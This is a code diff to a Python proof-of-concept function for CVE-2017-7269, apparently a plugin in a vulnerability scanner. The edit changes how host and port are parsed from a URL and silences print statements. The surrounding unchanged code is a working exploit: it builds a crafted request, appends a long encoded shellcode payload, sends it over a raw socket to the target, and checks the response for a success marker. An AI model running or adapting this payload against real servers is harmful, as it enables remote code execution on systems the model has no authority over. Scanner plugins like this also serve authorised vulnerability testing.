@@ -9,8 +9,10 @@ import socket
 
 
 def poc(arg, **kwargs):
-    host = kwargs.get("ip")
-    port = kwargs.get("port")
+    if '://' in str(arg):
+        arg = arg.split('//')[1]
+    host = arg.split(':')[0]
+    port = int(arg.split(':')[1])
     if not host or not port:
         return False
     try:
@@ -23,17 +25,17 @@ def poc(arg, **kwargs):
         shellcode = b'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJIOPKSKPKPTKLITKKQDKU0G0KPKPM00QQXI8KPM0M0K8KPKPKPM0QNTKKNU397N30WRJLMSSI7LNR72JPTKOXPZKQH0CR615NMNRP0NQNWNMOGP206NYKPOSRORN3D35RND4NMPTD9RP2ENZMPT4352XCDNOS8BTBMBLLMKZOSROBN441URNT4NMPL2ERNS7SDBHOJOBNVO0LMLJLMKZ0HOXOY0TO0OS260ENMNRP0NQOGNMOGOB06OIMP2345RCS3RET3D3M0KLK8SRM0KPM0C0SYK5NQWP2DDK0PNP4KQBLLTKQBMDDKD2MXLOGG0JO6NQKO6LOLQQSLKRNLMP7QXOLMM18G9RJRR2R74KQBLP4K0JOL4K0LN1RXK3PHKQHQ0Q4K29MPM19CTKQ9MH9SOJQ94KNTTKKQJ6P1KOFLY1XOLMKQXGNX9PD5KFM33MKHOKSMO42UJDPXTKB8O4KQIC1V4KLL0K4K0XMLKQXSTKKTTKKQJ0CYQ4O4MTQKQK1QR90Z0QKOYPQOQOQJ4KLRJKTM1MWKOWMCBR2OQZKPPSKOYEKPA'
         pay += shellcode
         pay += b'>\r\n\r\n'
-        print(pay)
+        # print(pay)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(6.0)
         sock.connect((host, port))
         sock.sendall(pay)
         try:
             data = sock.recv(80960).decode()
-            print(data)
+            # print(data)
         except:
             data = ""
-        print(data)
+        # print(data)
         sock.close()
         if not -1 == data.find('HHIT CVE-2017-7269 Success'):
             result = {
